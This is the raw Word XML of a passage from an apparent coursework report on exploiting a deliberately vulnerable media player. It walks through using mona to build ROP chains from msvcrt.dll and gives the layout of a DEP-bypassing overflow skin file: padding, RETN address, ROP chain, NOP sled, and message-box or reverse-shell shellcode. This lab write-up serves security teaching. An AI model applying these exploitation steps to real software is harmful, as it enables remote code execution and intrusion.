    <w:p w14:paraId="0C00CA2E" w14:textId="1B36B69C" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="008332D2">
      <w:r>
        <w:t>This command creates an ROP chain in multiple languages from the msvcrt.dll file while omitting common bad characters like 00, 0a, and 0d.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBB45B3" w14:textId="1AF2DE96" w:rsidR="00E74F68" w:rsidRPr="001A3AB1" w:rsidRDefault="00540A65" w:rsidP="008332D2">
      <w:r>
        <w:t>Pressing enter and looking into the Log Data window reveals that the ROP generation was completed successfully.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB6B9CC" w14:textId="77777777" w:rsidR="001B21C2" w:rsidRDefault="00E74F68" w:rsidP="001B21C2">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76000C6F" wp14:editId="454CCF07">
            <wp:extent cx="4181475" cy="12668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4317" b="-1"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4181475" cy="1266825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5EB67A" w14:textId="636AE127" w:rsidR="009F5231" w:rsidRDefault="001B21C2" w:rsidP="001B21C2">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Log Data window Output from mona</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D380A75" w14:textId="706A931A" w:rsidR="001B21C2" w:rsidRDefault="001B21C2" w:rsidP="001B21C2">
      <w:r>
        <w:t>This creates a file, rop_chains.txt, in the Immunity Debugger folder with all the ROP chains found. Near the bottom of the file exists a chain for Ruby which, unlike the others, is complete.</w:t>
      </w:r>
      <w:r w:rsidR="002460EF">
        <w:t xml:space="preserve"> See figure 25 for a screenshot of this section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DEE9B5" w14:textId="2AEF82A5" w:rsidR="002460EF" w:rsidRDefault="001B21C2" w:rsidP="002460EF">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="155776DF" wp14:editId="11F24B9C">
            <wp:extent cx="4560125" cy="3560405"/>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64297" cy="3563663"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="499AFDA9" w14:textId="0121BD27" w:rsidR="001B21C2" w:rsidRDefault="002460EF" w:rsidP="002460EF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Complete Ruby ROP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D78D17" w14:textId="16136EA4" w:rsidR="001B21C2" w:rsidRDefault="002460EF" w:rsidP="001B21C2">
      <w:r>
        <w:t>Now, as shown in Appendix C1, a single RET instruction needs to be found to begin the process. This can be done by inputting the following command into Immunity’s input box, which looks for possible return instructions to use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B30053" w14:textId="2BC04735" w:rsidR="00A35206" w:rsidRDefault="00A35206" w:rsidP="001B21C2">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251709440" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="59570F8A" wp14:editId="4A32214B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1020445</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>42545</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4050665" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="26035" b="1460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0665" cy="1404620"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="7A386193" w14:textId="26239BA7" w:rsidR="002460EF" w:rsidRDefault="002460EF" w:rsidP="002460EF">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">!mona find -type </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:t>instr</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:t xml:space="preserve"> -s "</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:t>retn</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:t>" -m msvcrt.dll -</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:t>cpb</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:t xml:space="preserve"> '\x00\x0a\x0d'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570F8A" id="_x0000_s1037" type="#_x0000_t202" style="position:absolute;margin-left:80.35pt;margin-top:3.35pt;width:318.95pt;height:110.6pt;z-index:251709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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w14:paraId="7A386193" w14:textId="26239BA7" w:rsidR="002460EF" w:rsidRDefault="002460EF" w:rsidP="002460EF">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">!mona find -type </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>instr</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> -s "</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>retn</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t>" -m msvcrt.dll -</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>cpb</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> '\x00\x0a\x0d'</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EA7220" w14:textId="5A32537D" w:rsidR="00A35206" w:rsidRDefault="00A35206" w:rsidP="001B21C2">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251711488" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="69DF0282" wp14:editId="0EC7AEC6">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1199973</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>137470</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4050665"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4050665" cy="635"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="56B234B4" w14:textId="28483F7E" w:rsidR="002460EF" w:rsidRPr="008C0E4A" w:rsidRDefault="002460EF" w:rsidP="002460EF">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>26</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - mona return finding command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DF0282" id="Text Box 38" o:spid="_x0000_s1038" type="#_x0000_t202" style="position:absolute;margin-left:94.5pt;margin-top:10.8pt;width:318.9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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="56B234B4" w14:textId="28483F7E" w:rsidR="002460EF" w:rsidRPr="008C0E4A" w:rsidRDefault="002460EF" w:rsidP="002460EF">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>26</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - mona return finding command</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F34B91" w14:textId="4813D80F" w:rsidR="00A35206" w:rsidRDefault="00A35206" w:rsidP="001B21C2"/>
    <w:p w14:paraId="0CE6B15C" w14:textId="169096D2" w:rsidR="002460EF" w:rsidRDefault="00A35206" w:rsidP="001B21C2">
      <w:r>
        <w:t xml:space="preserve">This will create another text file in the same folder as rop_chains.txt named ‘find.txt’. </w:t>
      </w:r>
      <w:r w:rsidR="00E45F3F">
        <w:t>Scroll down and locate the ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E45F3F">
        <w:t>retn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E45F3F">
        <w:t>’ memory locations that say “PAGE_EXECUTE_READ” and copy one for use in the Perl file that will be created to craft the payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37613DB3" w14:textId="68ACB437" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251713536" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="18BB6B5D" wp14:editId="15125B89">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>812800</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>100965</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4260215" cy="1509395"/>
            <wp:effectExtent l="0" t="0" r="6985" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21264"/>
                <wp:lineTo x="21539" y="21264"/>
                <wp:lineTo x="21539"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r="64758"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4260215" cy="1509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FFC61F" w14:textId="77777777" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2"/>
    <w:p w14:paraId="6C8E83E7" w14:textId="5BD4B303" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2"/>
    <w:p w14:paraId="391DBE16" w14:textId="772ED65B" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2"/>
    <w:p w14:paraId="634E1163" w14:textId="224ADAB2" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2"/>
    <w:p w14:paraId="5E25CD4D" w14:textId="042505DC" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251715584" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0053348C" wp14:editId="2C37F3DC">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>689757</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>262255</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4592955" cy="635"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="20057"/>
                    <wp:lineTo x="21501" y="20057"/>
                    <wp:lineTo x="21501"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4592955" cy="635"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="50701B82" w14:textId="35DA4848" w:rsidR="00E45F3F" w:rsidRPr="005855D1" w:rsidRDefault="00E45F3F" w:rsidP="00E45F3F">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>27</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - Valid and Invalid choices for memory locations. Must be in EXECUTABLE memory.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53348C" id="Text Box 46" o:spid="_x0000_s1039" type="#_x0000_t202" style="position:absolute;margin-left:54.3pt;margin-top:20.65pt;width:361.65pt;height:.05pt;z-index:-251600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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="50701B82" w14:textId="35DA4848" w:rsidR="00E45F3F" w:rsidRPr="005855D1" w:rsidRDefault="00E45F3F" w:rsidP="00E45F3F">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>27</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - Valid and Invalid choices for memory locations. Must be in EXECUTABLE memory.</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="tight"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="117B5661" w14:textId="43F6B0E2" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2"/>
    <w:p w14:paraId="69ECA996" w14:textId="35BDB6DB" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="001B21C2">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Copy any of the valid memory locations and create another Perl file as shown in </w:t>
      </w:r>
      <w:r w:rsidRPr="00C14656">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00C14656" w:rsidRPr="00C14656">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> B8</w:t>
      </w:r>
      <w:r w:rsidR="00C14656">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00C14656">
        <w:t>Substituting the memory location with any other valid one if necessary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FEC29D" w14:textId="529FBFB1" w:rsidR="00C14656" w:rsidRDefault="00C14656" w:rsidP="001B21C2">
      <w:r>
        <w:t>Load up Immunity and attach the media player again. This time, press CTRL + G to open up a ‘find’ menu, and enter the return memory address. This will highlight its location in memory. Press F2 to set a breakpoint there and run the program uploading the ropcrosh.ini file, which should hit the breakpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5589B880" w14:textId="084F759A" w:rsidR="00C14656" w:rsidRDefault="00C14656" w:rsidP="001B21C2">
      <w:r>
        <w:t>This should also highlight the “BBBB” section of the payload, which suggests everything is working as expected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B52786" w14:textId="56D8DF41" w:rsidR="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58F9AB03" wp14:editId="7D22693A">
            <wp:extent cx="3667125" cy="8096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67125" cy="809625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1CAEF3" w14:textId="5F4ECE60" w:rsidR="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msvcrt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> breakpoint hit by the payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A112F23" w14:textId="21C66519" w:rsidR="00D87FE7" w:rsidRPr="00D87FE7" w:rsidRDefault="00D87FE7" w:rsidP="00D87FE7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc103326469"/>
      <w:r>
        <w:t>Creating the payload</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:p w14:paraId="11B1E202" w14:textId="56E1DF57" w:rsidR="00C14656" w:rsidRDefault="00F21893" w:rsidP="001B21C2">
      <w:r>
        <w:t xml:space="preserve">In order to make use of a </w:t>
      </w:r>
      <w:r w:rsidR="00B539AC">
        <w:t>proper payload</w:t>
      </w:r>
      <w:r>
        <w:t>, the following structure must be used when creating the next ropcrash.pl file. This first one was only a proof of concept.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0557F639" w14:textId="6592D462" w:rsidR="00F21893" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>File name and header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEA90D0" w14:textId="7F1561F3" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Overflow (“A” x 484)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143A685E" w14:textId="50F0BBAE" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Pointer to RETN (0x77C1128A in this case)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5CD35C" w14:textId="4C871486" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>“BBBB” to get the Pointer to the top of the stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752B4818" w14:textId="7F71DC8C" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>ROP Chain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E26D441" w14:textId="7DE3BD6B" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>NOP sled (“\x90” x 20”)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E6A9FC" w14:textId="34A4C38C" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Shellcode (message box, reverse shell, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEA900C" w14:textId="128C711A" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Open, print to file, close.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B6FF5C" w14:textId="6AC9D240" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:r>
        <w:t>To change the ROP chain created by mona.py from Ruby to Perl, copy the rop2perl.exe from the “Tools” folder and double click it. This will create a text file in the Immunity Debugger folder called “rop_perl.txt”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B93D995" w14:textId="582E9072" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:r>
        <w:t xml:space="preserve">Copy the contents into a new ropcrash.pl file as shown in </w:t>
      </w:r>
      <w:r w:rsidRPr="00B539AC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Appendix B9</w:t>
      </w:r>
      <w:r w:rsidR="00BA18EC">
        <w:t>, and double click it to create the ropcrash.ini file</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D68513D" w14:textId="63E13C8B" w:rsidR="00BA18EC" w:rsidRPr="00BA18EC" w:rsidRDefault="00BA18EC" w:rsidP="00B539AC">
      <w:r>
        <w:t xml:space="preserve">Uploading this as a skin </w:t>
      </w:r>
      <w:r w:rsidR="00734785">
        <w:t xml:space="preserve">to the media player </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">should result in a message box popup as shown in </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA18EC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 17</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, meaning the DEP was successfully circumvented through the use of ROP chains. It is also possible to replace the shellcode in this file with the reverse shell, which will function exactly the same as demonstrated in </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA18EC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Section 2.5.6</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DBAF10" w14:textId="77777777" w:rsidR="00B539AC" w:rsidRDefault="00B539AC" w:rsidP="00B539AC">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D68D81F" w14:textId="77777777" w:rsidR="00F21893" w:rsidRPr="001B21C2" w:rsidRDefault="00F21893" w:rsidP="001B21C2"/>
    <w:p w14:paraId="72B76F28" w14:textId="15A2E291" w:rsidR="00D828F5" w:rsidRDefault="00341658" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc102919484"/>
      <w:bookmarkStart w:id="36" w:name="_Toc103326470"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="02304DC3" w14:textId="09D6A071" w:rsidR="00493395" w:rsidRDefault="00493395" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc102919485"/>
      <w:bookmarkStart w:id="38" w:name="_Toc103326471"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>General Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="0DE4FCBD" w14:textId="77777777" w:rsidR="00437906" w:rsidRDefault="00247263" w:rsidP="008332D2">
      <w:r>
        <w:t>From the results, it can be seen that</w:t>
      </w:r>
      <w:r w:rsidR="0068240D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t xml:space="preserve">the Vulnerable Media Player - 2003114.exe - was vulnerable to a number of different exploits of varying levels of complexity due to the lack of diligence on behalf of its creators </w:t>
      </w:r>
      <w:r w:rsidR="00B657F1">
        <w:t>in regard to</w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
